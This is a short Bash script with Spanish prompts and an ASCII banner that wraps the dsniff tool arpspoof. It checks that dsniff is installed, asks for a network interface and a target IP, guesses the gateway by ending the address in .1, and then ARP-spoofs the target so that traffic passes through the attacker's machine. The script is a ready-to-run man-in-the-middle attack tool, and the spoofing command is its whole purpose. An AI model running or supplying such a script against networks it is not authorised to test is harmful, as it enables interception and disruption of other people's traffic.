#!/bin/bash

echo -e  "\e[32mCreado por Oney el H3\e[0m"


cat << "EOF" 
       .--.
      |o_o |
      |:_/ |
     //   \ \
    (|     | )
    /'\_   _/`\
    \___)=(___/
EOF


check_herramienta() {
    if ! [ -x "$(command -v $1)" ]; then
        echo "Error: $1 no está instalado. Por favor, instala $1 y vuelve a intentarlo." >&2
        exit 1
    fi
}


check_herramienta "dsniff"


read -p "Inserte la interfaz de red que quieras analizar: " interfaz
read -p "Inserte la IP objetivo: " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')


arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
